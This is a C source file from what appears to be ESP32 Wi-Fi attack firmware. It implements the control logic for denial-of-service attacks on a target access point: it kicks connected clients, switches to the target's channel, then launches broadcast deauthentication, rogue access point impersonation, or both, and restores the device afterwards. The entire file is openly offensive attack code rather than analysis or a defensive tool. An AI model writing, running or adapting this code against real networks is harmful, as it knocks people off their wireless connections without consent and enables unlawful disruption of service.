/**
 * @file attack_dos.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-07
 * @copyright Copyright (c) 2021
 * 
 * @brief Implements DoS attacks using deauthentication methods
 */
#include "attack_dos.h"

#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "attack.h"
#include "attack_method.h"
#include "wifi_controller.h"

static const char *TAG = "main:attack_dos";
static attack_dos_methods_t method = -1;

void attack_dos_start(attack_config_t *attack_config) {
    ESP_LOGI(TAG, "Starting DoS attack...");
    method = attack_config->method;
    
    // First, kick all connected STAs so we can change channels safely
    ESP_LOGD(TAG, "Kicking connected clients to change channel...");
    esp_wifi_deauth_sta(0);
    // Wait for the stack to process the disconnection
    vTaskDelay(pdMS_TO_TICKS(500));

    // Try to switch channel up to 5 times (highly robust)
    esp_err_t err = ESP_FAIL;
    uint8_t target_chan = attack_config->ap_record->primary;
    for(int i = 0; i < 5; i++) {
        err = wifictl_set_channel(target_chan);
        if(err == ESP_OK) {
            ESP_LOGI(TAG, "Channel switch to %d success (attempt %d)", target_chan, i + 1);
            break;
        }
        ESP_LOGW(TAG, "Channel switch failed (attempt %d). Retrying...", i + 1);
        vTaskDelay(pdMS_TO_TICKS(200));
    }
    
    if(err != ESP_OK) {
        ESP_LOGE(TAG, "FATAL: Could not set channel. Attack may be ineffective!");
    }
    
    switch(method){
        case ATTACK_DOS_METHOD_BROADCAST:
            ESP_LOGD(TAG, "ATTACK_DOS_METHOD_BROADCAST");
            attack_method_broadcast(attack_config->ap_record, 100);
            break;
        case ATTACK_DOS_METHOD_ROGUE_AP:
            ESP_LOGD(TAG, "ATTACK_DOS_METHOD_ROGUE_AP");
            attack_method_rogueap(attack_config->ap_record);
            break;
        case ATTACK_DOS_METHOD_COMBINE_ALL:
            ESP_LOGD(TAG, "ATTACK_DOS_METHOD_ROGUE_AP");
            attack_method_rogueap(attack_config->ap_record);
            attack_method_broadcast(attack_config->ap_record, 100);
            break;
        default:
            ESP_LOGE(TAG, "Method unknown! DoS attack not started.");
    }
}

void attack_dos_stop() {
    switch(method){
        case ATTACK_DOS_METHOD_BROADCAST:
            attack_method_broadcast_stop();
            wifictl_set_channel(CONFIG_MGMT_AP_CHANNEL);
            wifictl_mgmt_ap_start();
            break;
        case ATTACK_DOS_METHOD_ROGUE_AP:
            wifictl_mgmt_ap_start();
            wifictl_restore_ap_mac();
            break;
        case ATTACK_DOS_METHOD_COMBINE_ALL:
            attack_method_broadcast_stop();
            wifictl_mgmt_ap_start();
            wifictl_restore_ap_mac();
            break;
        default:
            ESP_LOGE(TAG, "Unknown attack method! Attack may not be stopped properly.");
    }
    ESP_LOGI(TAG, "DoS attack stopped");
}